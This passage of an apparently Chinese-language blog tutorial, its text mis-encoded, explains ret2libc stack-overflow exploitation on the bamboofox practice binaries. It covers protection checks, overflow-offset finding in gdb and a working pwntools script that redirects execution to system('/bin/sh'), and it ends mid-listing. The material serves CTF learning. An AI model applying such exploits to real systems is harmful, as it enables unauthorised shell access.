/proc/[pid]/maps</code>æŸ¥çœ‹ï¼Œstackæ˜¯rwçš„è€Œä¸æ˜¯rwxã€‚</p><p>ä¸‰é“é¢˜åˆ†å¸ƒå¯¹åº”ä¸‹é¢ä¸‰ä¸ªå°ç»“</p><ul><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc1">ret2libc1</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc2">ret2libc2</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc3">ret2libc3</a></li></ul><h4 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                            æ ˆ  ï¼ˆè¿›å…¥å±é™©å‡½æ•°ä¹‹å‰ï¼‰ </span><br><span class="line">&lt;-------------------------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP         call function             args</span><br><span class="line">|--------------------|-------------|----------------|---------|</span><br><span class="line">|     ..........     | JMP å‡½æ•°åœ°å€  |  PUSH è¿”å›åœ°å€  |  value  |</span><br><span class="line">|--------------------|-------------|----------------|---------|</span><br><span class="line">                  åˆ©ç”¨æº¢å‡ºè¦†ç›–è¿”å›åœ°å€å’Œå‚æ•°</span><br><span class="line">                  </span><br><span class="line">                             </span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                    æ ˆ  ï¼ˆè¿›å…¥å±é™©å‡½æ•°ä¹‹åï¼‰</span><br><span class="line"> &lt;-------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP       EIP        args</span><br><span class="line">|--------------------|-------------|---------|</span><br><span class="line">|     ..........     | return addr |  value  |</span><br><span class="line">|--------------------|-------------|---------|</span><br><span class="line">                  åˆ©ç”¨æº¢å‡ºè¦†ç›–è¿”å›åœ°å€å’Œå‚æ•°</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                           </span><br><span class="line">                      æ ˆ ï¼ˆè¦†ç›–ä¹‹åï¼‰</span><br><span class="line">&lt;------------------------------------------------------------------------------------------&gt;</span><br><span class="line">        ESP              EBP                           call function               args</span><br><span class="line">|-----------------|-------------|----------------------------|-----------------|-----------|</span><br><span class="line">| AAAAAAAAAAAAAAAAAAAAAAAAAAAAA | JMP (system function addr) | PUSH return addr| &quot;&#x2F;bin&#x2F;sh&quot; |</span><br><span class="line">|-----------------|-------------|----------------------------|-----------------|-----------|</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆç»“æœï¼š</span><br><span class="line">1.æŠŠè¿”å›åœ°å€çš„å€¼è¦†ç›–ä¸ºsystem()å‡½æ•°çš„åœ°å€</span><br><span class="line">2.æ­£å¸¸æ‰§è¡Œæ ˆ</span><br><span class="line">3.æ‰§è¡Œå®Œæ ˆåè°ƒç”¨RETæ±‡ç¼–æŒ‡ä»¤ï¼ˆPOPå‡ºsystem()å‡½æ•°çš„åœ°å€ï¼ŒæŠŠEIPæŒ‡å‘system()å‡½æ•°çš„åœ°å€ï¼‰</span><br><span class="line">4.å½“æ‰§è¡Œå®Œç¬¬ä¸‰æ­¥åï¼Œå°±ä¼šæ„æˆä¸€ä¸ªæ–°çš„æ ˆï¼šå‚æ•°-&gt;call systemå‡½æ•°</span><br><span class="line">5.æ‰§è¡Œæ–°æ„å»ºçš„æ ˆï¼Œè¿›è€Œè·å–æ§åˆ¶å°æƒé™</span><br></pre></td></tr></table></figure><hr><h4 id="å­˜åœ¨system-å‡½æ•°å’Œ-bin-shå­—ç¬¦ä¸²"><a href="#å­˜åœ¨system-å‡½æ•°å’Œ-bin-shå­—ç¬¦ä¸²" class="headerlink" title="å­˜åœ¨system()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²"></a>å­˜åœ¨system()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²</h4><p>ä»¥ bamboofox ä¸­ ret2libc1 ä¸ºä¾‹ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ä¸€ä¸‹ç¨‹åºçš„å®‰å…¨ä¿æŠ¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æºç¨‹åºä¸º 32 ä½ï¼Œå¼€å¯äº† NX ä¿æŠ¤ã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸‹ç¨‹åºæºä»£ç ï¼Œç¡®å®šæ¼æ´ä½ç½®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œ gets å‡½æ•°çš„æ—¶å€™å‡ºç°äº†æ ˆæº¢å‡ºï¼Œæ¥ç€å®šä½æº¢å‡ºå€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span></span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/kali/Desktop/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb0580 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xfbad2288 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EBP: 0x6941414d (<span class="string">&#x27;MAAi&#x27;</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">EIP: 0x41384141 (<span class="string">&#x27;AA8A&#x27;</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0020| 0xffffd234 (<span class="string">&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0024| 0xffffd238 (<span class="string">&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0028| 0xffffd23c (<span class="string">&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æº¢å‡ºçš„ä½ç½®åœ¨112çš„åœ°æ–¹</p><p>æ¥ç€åˆ©ç”¨<strong>ropgadget</strong>ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰<code>/bin/sh</code>å­˜åœ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ ROPgadget --binary ret2libc1 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨IDAä¸­å¯ä»¥çœ‹åˆ°æœ‰<code>system</code>è¿™ä¸ªå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ASRLçš„è¯å†Windowsä¸Šé¢çœ‹åˆ°çš„åœ°å€å’Œä½ åœ¨Linuxè¿è¡Œåçš„åœ°å€æ˜¯ç›¸åŒçš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/12.png" alt="image-20201120115231916"></p><p>æˆ‘ä»¬è¦çš„ä¸œè¥¿éƒ½é½äº†ä»¥åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™EXPäº†ï¼ŒEXPä¸­æ ˆæ‹¼æ¥å¯¹åº”ä¸Šé¢çš„åˆ©ç”¨åŸç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;../ret2libc1&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/13.png" alt="image-20201120115749503"></p><p>payloadåœ¨æ ˆä¸­çš„éƒ¨ç½²ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                              +---------------------------+</span><br><span class="line">                              |          binsh_addr       | éƒ¨ç½²binsh_addrä½œä¸ºæ±‡ç¼–systemå‡½æ•°çš„å‚æ•°</span><br><span class="line">              +-              +---------------------------+</span><br><span class="line">              | PUSH è¿”å›åœ°å€  |           bbbb            | éƒ¨ç½²bbbbä½œä¸ºæ±‡ç¼–æ­£å¸¸è°ƒç”¨systemå‡½æ•°çš„è¿”å›åœ°å€ </span><br><span class="line">call system &lt;-|               +---------------------------+</span><br><span class="line">              | JMP å‡½æ•°åœ°å€   |        system_plt         | æ‰§è¡Œsystem_pltï¼Œè¦†ç›–åŸretè¿”å›ä½ç½®</span><br><span class="line">              +-              +---------------------------+</span><br><span class="line">                              |           aaaa            | aaaaè¦†ç›–åŸebpä½ç½®</span><br><span class="line">                       ebp---&gt;+---------------------------+</span><br><span class="line">                              |           aaaa            | aaaaå ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">                              |           ....            |        ......</span><br><span class="line">                              |           aaaa            | aaaaå ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">                              |           aaaa            | aaaaå ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">                              |           aaaa            | aaaaå ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">                              +---------------------------+</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯æ­£å¸¸è°ƒç”¨ system å‡½æ•°ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„è¿”å›åœ°å€ï¼ˆ<strong>å°±æ˜¯callæŒ‡ä»¤ä¸‹é¢çš„åœ°å€</strong>ï¼‰ï¼Œè€Œç°åœ¨æˆ‘ä»¬å¹¶ä¸æ˜¯æ­£å¸¸è°ƒç”¨ï¼Œæ‰€ä»¥éœ€è¦è¡¥ä¸Šä¸€ä¸ª<code>bbbb</code>ä½œä¸ºè™šæ‹Ÿè¿”å›åœ°å€ï¼ˆ<strong>ä¹Ÿå°±æ˜¯CALLæŒ‡ä»¤æ‹†åˆ†æˆä¸¤æ­¥ä¸­çš„ç¬¬ä¸€æ­¥PUSH è¿”å›åœ°å€</strong>ï¼‰</p><hr><h4 id="åªå­˜åœ¨system-å‡½æ•°"><a href="#åªå­˜åœ¨system-å‡½æ•°" class="headerlink" title="åªå­˜åœ¨system()å‡½æ•°"></a>åªå­˜åœ¨system()å‡½æ•°</h4><p>ä»¥ bamboofox ä¸­ ret2libc2ä¸ºä¾‹ï¼Œæ‹¿åˆ°æ–‡ä»¶ä¾æ—§è¿›è¡ŒæŸ¥çœ‹ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ret2libc2</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æº¢å‡ºå‡½æ•°ä¾æ—§æ˜¯ä¸Šæ–‡ä¸­çš„é‚£ä¸ªå¹¶ä¸”<code>system()</code>çš„åœ°å€æ˜¯<strong>0x08048490</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/14.png" alt="image-20201120142854442"></p><p>ä½†æ˜¯æˆ‘ä»¬ç”¨ROPgadgetå¹¶æ— æ‰¾åˆ°<code>/bin/sh</code>ä½ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬æ€ä¹ˆè·å–å­—ç¬¦ä¸²å‘¢ï¼Ÿæˆ‘ä»¬åœ¨PLTè¡¨ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª<code>gets()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥è·å–å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åœ°å€ä¸º<strong>0x08048460</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/15.png" alt="image-20201120144606722"></p><p>åæ±‡ç¼–æŸ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/16.png" alt="image-20201120144720027"></p><p>å‘ç°ä¼ å…¥ä¸€ä¸ªæŒ‡é’ˆåå³å¯è¿”å›æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ¥ç€æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯è¯»å¯å†™çš„bufferåŒºï¼Œé€šå¸¸ä¼šå¯»æ‰¾<code>.bss</code>æ®µï¼Œé€šè¿‡<strong>readelf</strong>å‘½ä»¤æ¥æŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ readelf -S ret2libc2</span><br><span class="line">There are 35 section headers, starting at offset 0x1924:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000f0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080482c8 0002c8 000096 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804835e 00035e 00001e 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804837c 00037c 000030 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080483ac 0003ac 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080483c4 0003c4 000058 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        0804841c 00041c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048440 000440 0000c0 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048500 000500 000242 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048744 000744 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048758 000758 000065 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080487c0 0007c0 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        080487f4 0007f4 0000d0 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001040 00002b 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 00106b 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 00108b 000329 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 0013b4 0000f8 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 0014ac 0000c2 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 00156e 00026d 01  MS  0   0  1</span><br><span class="line">  [32] .shstrtab         STRTAB          00000000 0017db 000146 00      0   0  1</span><br><span class="line">  [33] .symtab           SYMTAB          00000000 001e9c 000540 10     34  50  4</span><br><span class="line">  [34] .strtab           STRTAB          00000000 0023dc 000314 00      0   0  1</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°<strong>.bss</strong>æ˜¯ä»<strong>0x0804a040</strong>çš„ä½ç½®å¼€å§‹çš„ï¼Œç„¶åæŒ‰ç€è¿™ä¸ªæ®µæ‰¾åˆ°äº†<strong>0x0804A080</strong>è¿™ä¸ªä½ç½®æ˜¯ä¸ªcharæ•°ç»„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/17.png" alt="image-20201120182503721"></p><p>æ¥ç€å¯ä»¥çœ‹åˆ°<strong>.bss</strong>æ˜¯èƒ½è¯»å†™ï¼Œç”±äºç¨‹åºåœ¨gdbä¸­è¿è¡Œï¼Œå°±ç®—å…³é—­äº†ALSRä¹Ÿä¼šå’Œåœ¨gdbå¤–è¿è¡Œä¸åŒã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ gdb -q ret2libc2</span><br><span class="line">Reading symbols from ret2libc2...</span><br><span class="line">gdb-peda$ run </span><br><span class="line">Starting program: /home/kali/Desktop/Pwn/ret2libc2 </span><br><span class="line">Something surprise here, but I don<span class="string">&#x27;t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?</span></span><br><span class="line"><span class="string">[Inferior 1 (process 10047) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">gdb-peda$ vmmap</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">Start      End        Perm      Name</span></span><br><span class="line"><span class="string">0x0804841c 0x08048758 rx-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08048154 0x080488c4 r--p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08049f08 0x0804a0e4 rw-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å¯»æ‰¾<code>add esp, 4</code>è¿™æ ·çš„æŒ‡ä»¤ï¼Œè‡³äºä¸ºä»€ä¹ˆå‘¢å› ä¸ºæˆ‘ä»¬è°ƒç”¨gets()å‡½æ•°çš„æ—¶å€™pushäº†ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯<code>/bin/sh</code>ï¼Œå‡½æ•°ç»“æŸçš„è¯å¦‚æœä¸è®©å †æ ˆå¹³è¡¡ï¼Œé‚£ä¹ˆæœ€åç»“æŸæ•´ä¸ªå‡½æ•°çš„æ—¶å€™ebpçš„å€¼å›æ¯”åŸæ¥ä½ï¼Œå…·ä½“ä½4ä¸ªå­—èŠ‚è¿˜æ˜¯8ä¸ªçœ‹è¿›ç¨‹çš„ä½æ•°å»ã€‚æœ€ååœ¨è¿™é¢˜ç»“æŸä¼šæ”¾ä¸ªcç¨‹åºè°ƒè¯•çš„ä¾‹å­ä½œä¸ºè§£é‡Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 